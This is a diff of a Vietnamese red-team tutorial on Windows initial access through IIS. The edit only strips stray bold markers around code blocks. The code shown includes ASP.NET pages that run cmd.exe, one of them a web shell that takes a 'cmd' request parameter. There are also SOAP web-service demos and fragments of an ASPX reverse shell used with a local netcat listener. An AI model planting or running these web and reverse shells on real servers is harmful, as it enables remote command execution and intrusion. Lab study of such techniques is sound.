@@ -46,7 +46,7 @@ Và mình sẽ thử một vài demo chạy code **`ASP`** để tìm hiểu rõ
 ### ✨ `ASP Classic`
 
 ```vbnet
-**<%@ Language="VBScript" %>
+<%@ Language="VBScript" %>
 <html>
 <head>
     <title>ASP Classic + HTML</title>
@@ -80,7 +80,7 @@ Và mình sẽ thử một vài demo chạy code **`ASP`** để tìm hiểu rõ
     <p>User chay IIS: <%= Request.ServerVariables("LOGON_USER")%></p>
     </ul>
 </body>
-</html>**
+</html>
 ```
 
 ![image](/assets/images/redteam/WindowsInitialAccess/image%206.png)
@@ -88,7 +88,7 @@ Và mình sẽ thử một vài demo chạy code **`ASP`** để tìm hiểu rõ
 ### ✨ `ASP.NET` (`.aspx`) - Execution Code
 
 ```vbnet
-**<%@ Page Language="C#" %> 
+<%@ Page Language="C#" %> 
 <%
     var p = new System.Diagnostics.Process();
     p.StartInfo.FileName = "cmd.exe";
@@ -98,7 +98,7 @@ Và mình sẽ thử một vài demo chạy code **`ASP`** để tìm hiểu rõ
     p.Start();
 
     Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
-%>**
+%>
 ```
 
 Khi chạy mình sẽ báo lỗi. 
@@ -118,7 +118,7 @@ Khi reload lại file → nó in ra chi tiết lỗi
 Như vậy mình cần fix lại 
 
 ```vbnet
-**<%@ Page Language="C#" %> 
+<%@ Page Language="C#" %> 
 <%
     System.Diagnostics.Process p = new System.Diagnostics.Process();
     p.StartInfo.FileName = "cmd.exe";
@@ -128,7 +128,7 @@ Như vậy mình cần fix lại
     p.Start();
 
     Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
-%>**
+%>
 ```
 
 ![image](/assets/images/redteam/WindowsInitialAccess/image%2010.png)
@@ -136,7 +136,7 @@ Như vậy mình cần fix lại
 ### ✨ Execution Code
 
 ```vbnet
-**<%@ Page Language="C#" %>
+<%@ Page Language="C#" %>
 
 <%
     string cmd = Request["cmd"];
@@ -152,7 +152,7 @@ Như vậy mình cần fix lại
 
         Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
     }
-%>**
+%>
 ```
 
 ![image](/assets/images/redteam/WindowsInitialAccess/image%2011.png)
@@ -200,7 +200,7 @@ Mình đặt file **`HelloService.asmx`**
 Sau đó mình đặt file **`HelloService.cs`** tại **`wwwroot/App_Code/HelloService.cs`** 
 
 ```vbnet
-**using System.Web.Services;
+using System.Web.Services;
 
 [WebService(Namespace = "http://example.com/hello")]
 public class HelloService : WebService
@@ -210,7 +210,7 @@ public class HelloService : WebService
     {
         return "Hello " + name;
     }
-}**
+}
 
 ```
 
@@ -239,7 +239,7 @@ Kết quả trả về sẽ như thế này.
 Thì ở đây mình thực hiện lại là tạo 1 file SimpleServiceMath như sau:
 
 ```vbnet
-**using System.Web.Services;
+using System.Web.Services;
 
 [WebService(Namespace = "http://example.com/math")]
 [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
@@ -271,14 +271,14 @@ public class SimpleServiceMath : WebService
 
         return a / b;
     }
-}**
+}
 
 ```
 
 Thì khi đó mình tạo lại với file.
 
 ```vbnet
-**<%@ WebService Language="C#" Class="SimpleServiceMath" %>**
+<%@ WebService Language="C#" Class="SimpleServiceMath" %>
 ```
 
 ![image](/assets/images/redteam/WindowsInitialAccess/image%2020.png)
@@ -288,7 +288,7 @@ Thì khi đó mình tạo lại với file.
 Thì khi đó mình có thể giao tiếp với endpoint này bằng cách tạo ra 1 file **`add.soap`**  
 
 ```vbnet
-**<?xml version="1.0" encoding="utf-8"?>
+<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
@@ -300,8 +300,7 @@ Thì khi đó mình có thể giao tiếp với endpoint này bằng cách tạo
       <b>3</b>
     </Add>
   </soap:Body>
-</soap:Envelope>**
-
+</soap:Envelope>
 ```
 
 Nhưng mình sẽ dùng extension **`Wsdler`** để thực hiện
@@ -627,7 +626,7 @@ Cuối cùng thì nó sẽ trả về lại kết quả.
 Mình thử tiến hành upload 1 reverse shell xem sao o(*￣︶￣*)o
 
 ```vbnet
-**<%@ Page Language="C#" %>
+<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net.Sockets" %>
@@ -674,7 +673,7 @@ Mình thử tiến hành upload 1 reverse shell xem sao o(*￣︶￣*)o
             }
         }
     }
-</script>**
+</script>
 ```
 
 Từ đây mình quan sát được netcat đang mở tại local.
